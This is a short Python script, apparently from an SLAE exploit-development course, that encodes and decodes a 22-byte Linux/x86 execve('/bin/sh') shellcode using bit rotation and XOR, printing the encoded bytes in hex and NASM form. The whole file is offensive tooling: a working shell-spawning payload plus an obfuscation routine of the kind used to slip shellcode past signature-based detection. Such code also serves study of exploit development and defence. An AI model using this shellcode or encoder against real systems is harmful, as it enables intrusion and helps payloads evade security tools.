#!/usr/bin/env python
# Title: ROL and XOR encoder
# Date: 2015-01-09
# Author: Dennis 'dhn' Herrmann
# Website: https://zer0-day.pw
# Github: https://github.com/dhn/SLAE/
# SLAE-721

import textwrap

# Linux/x86 execve("/bin/sh", 0, 0)
# Shellcode - 22 byte
shellcode_decoded = (
    "\x6a\x0b\x58\x31\xc9\x51\x68\x2f"
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    "\x89\xe3\x89\xca\xcd\x80"
)

# Encoded Shellcode
shellcode_encoded = (
    "\x12\x3e\x54\x79\x66\x75\x52\xba"
    "\xba\x31\x52\x52\xba\x13\x72\x92"
    "\x6e\x23\x6e\x06\xe6\x4f"
)


# Rotate right
def ror(val, r_bits, max_bits):
    return ((val & (2**max_bits-1)) >> r_bits % max_bits) | \
            (val << (max_bits-(r_bits % max_bits)) & (2**max_bits-1))


# Rotate light
def rol(val, r_bits, max_bits):
    return (val << r_bits % max_bits) & (2**max_bits-1) | \
            ((val & (2**max_bits-1)) >> (max_bits-(r_bits % max_bits)))


# ROL and XOR Encoder
def rol_xor_encoder(r_bits, max_bits, xor_value):
    print("[*] Encoding shellcode...")

    encoded_hex = ""
    encoded_nasm = ""

    for x in bytearray(shellcode_decoded):
        # ROL and XOR
        encoded = rol(x, r_bits, max_bits) ^ xor_value

        encoded_hex += '\\x'
        encoded_hex += '%02x' % (encoded & 0xff)

        encoded_nasm += '0x'
        encoded_nasm += '%02x,' % (encoded & 0xff)

    return encoded_hex, encoded_nasm


# ROL and XOR Decoder
def rol_xor_decoder(r_bits, max_bits, xor_value):
    print("[*] Decoding shellcode...")

    decoded_hex = ""

    for x in bytearray(shellcode_encoded):
        # ROL and XOR
        decoded = x ^ xor_value
        decoded = ror(decoded, r_bits, max_bits)

        decoded_hex += '\\x'
        decoded_hex += '%02x' % (decoded & 0xff)

    return decoded_hex


# Format output
def fmt_output(text, lines):
    return textwrap.fill(text, lines)


# Main function
if __name__ == "__main__":
    encoded_hex, encoded_nasm = rol_xor_encoder(5, 8, 0x5f)
    encoded_len = str(len(encoded_hex)/4)
    print("[*] Hex version ...\n\n%s\n" % fmt_output(encoded_hex, 32))
    print("[*] Nasm version ...\n\n%s\n" % fmt_output(encoded_nasm, 30))
    print("[*] Encoded shellcode length: %s bytes" % encoded_len)

    decoded_hex = rol_xor_decoder(5, 8, 0x5f)
    decoded_len = str(len(decoded_hex)/4)
    print("[*] Hex version ...\n\n%s\n" % fmt_output(decoded_hex, 32))
    print("[*] Decoded shellcode length: %s bytes" % decoded_len)
